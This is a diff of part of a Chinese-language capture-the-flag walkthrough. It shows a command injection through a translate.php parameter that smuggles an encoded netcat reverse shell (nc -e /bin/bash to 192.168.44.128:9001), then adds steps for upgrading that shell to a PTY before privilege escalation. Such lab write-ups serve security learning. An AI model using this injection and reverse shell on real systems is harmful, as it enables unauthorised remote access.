@@ -61,8 +61,12 @@ mx -v /yrm/yzhs 192.168.44.128 9001
 ```
 访问`http://192.168.44.134/translate.php?hmv=rw;mx -v /yrm/yzhs 192.168.44.128 9001
 
+刚监听的shell不太好用，使用下面这条命令打开一个pty伪终端
 ```C
 python3 -c 'import pty;pty.spawn("/bin/bash")'
+export TERM=xterm //设置终端类型为常见的xterm环境变量
+stty -a//以容易阅读的方式打印当前的所有配置
+reset //设定终端机的状态
 ```
 # 提权
 尝试读取第一个flag读取不到cat /home/ocean/user.txt
